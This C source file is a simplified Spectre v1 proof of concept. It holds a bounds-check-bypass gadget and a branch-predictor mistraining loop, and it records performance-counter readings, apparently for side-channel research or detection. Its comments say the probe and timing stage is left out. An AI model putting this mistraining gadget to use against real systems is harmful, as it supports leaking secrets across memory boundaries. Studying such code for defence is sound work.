/* Simplified Spectre PoC: Stage1 + Stage2 with labels */

#include <stdint.h>
#include <stdio.h>

#ifdef _MSC_VER
#include <intrin.h> /* for rdtscp and clflush */
#pragma optimize("gt",on)
#else
#include <x86intrin.h> /* for rdtscp and clflush */
#endif
#define NOP_REGION_BEGIN asm volatile("# NOP_REGION_BEGIN");
#define NOP_REGION_END   asm volatile("# NOP_REGION_END");

/********************************************************************
 Victim data
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {
    1,  2,  3,  4,
    5,  6,  7,  8,
    9, 10, 11, 12,
    13, 14, 15, 16
};
uint8_t unused2[64];
uint8_t array2[256 * 512];

uint8_t g_secret_value = 'Y';   // 默认 secret 值，可被框架修改
char *secret = (char *)&g_secret_value;
uint8_t temp = 0;

extern int pmu_stage1_get_count(void);
extern uint64_t pmu_stage1_get_delta(int i);
extern int pmu_stage2_get_count(void);
extern uint64_t pmu_stage2_get_delta(int i);

/********************************************************************
 Stage 2: Gadget (victim function)
 - 关键行为：
   * 条件分支：if (x < array1_size)
   * secret 驱动访问：array2[array1[x] * 512]
 - 标注：
   * STAGE2_BEGIN / STAGE2_END
********************************************************************/
__attribute__((noinline))
void spectre_function(size_t x) {

  printf("spectre_function: x=%zu\n", x);
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }

}


// Victim framework interface: set secret value
void vf_set_secret(uint8_t s) {
    g_secret_value = s;
}

// Victim framework interface: run one train+attack sequence
void vf_run_attack_once(void) {
    size_t malicious_x = (size_t)(secret - (char *)array1);
    stage1_mistrain_trigger(malicious_x);
}

// Victim framework interface: given a secret byte, return the probe address
volatile uint8_t *vf_get_probe_addr_for_secret(uint8_t s) {
    return &array2[(size_t)s * 512];
}

/********************************************************************
 Stage 1: Mistrain + Trigger
 - 关键行为：
   * 多轮训练 + 少量攻击调用 spectre_function(x)
   * 通过 bit-twiddling 构造 training_x / malicious_x
********************************************************************/
__attribute__((noinline))
void stage1_mistrain_trigger(size_t malicious_x) {

    int j;
    size_t training_x, x;

    /* 30 loops: 5 training runs per attack run, classic Spectre pattern */
    for (j = 29; j >= 0; j--) {

        /* training_x 在合法范围 [0, array1_size) 内 */
        training_x = (size_t)(j % 16);

        /* Flush array1_size to make the branch harder to predict */
        _mm_clflush(&array1_size);
        //_mm_clflush(&array2[(unsigned char)*secret * 512]);

        /* Small delay to separate iterations (防止过度重叠) */
        for (volatile int z = 0; z < 200; z++) {}

        /* Bit-twiddling to choose training_x or malicious_x without an explicit branch:
           x = training_x if (j % 6) != 0
           x = malicious_x if (j % 6) == 0
        */
        x = ((j % 6) - 1) & ~0xFFFF;   /* x = 0xFFFF0000 if j%6==0, else 0 */
        x = (x | (x >> 16));           /* x = -1 if j%6==0, else 0        */
        x = training_x ^ (x & (malicious_x ^ training_x));

        /* Call the victim gadget (Stage2) */
        spectre_function(x);
    }
}

/********************************************************************
 main: 初始化数据并执行 Stage1
 - 当前只执行一次阶段1（阶段2在其中被多次调用）
 - 不包含任何 probe / timing / 解析逻辑
********************************************************************/
#ifndef STAGE2_TEST_MAIN
int main(int argc, const char **argv) {
    /* malicious_x = secret_addr - array1_addr */
    size_t malicious_x = (size_t)(secret - (char *)array1);
    int i;

    /* 初始化 array2，避免 copy-on-write zero pages */
    for (i = 0; i < (int)sizeof(array2); i++) {
        array2[i] = 1;
    }

    /* 执行阶段1（内部多次调用阶段2） */
    stage1_mistrain_trigger(malicious_x);

    // 统一打印采集到的 delta
    int n = pmu_stage1_get_count();
    for (int i = 0; i < n; i++) {
        printf("STAGE1_DELTA_BR_MISP_COND[%d]=%llu\n",
               i,
               (unsigned long long)pmu_stage1_get_delta(i));
    }

    int y = pmu_stage2_get_count();
    for (int i = 0; i < y; i++) {
        printf("STAGE2_DELTA_CACGE_MISS_COND[%d]=%llu\n",
               i,
               (unsigned long long)pmu_stage2_get_delta(i));
    }
} 
#endif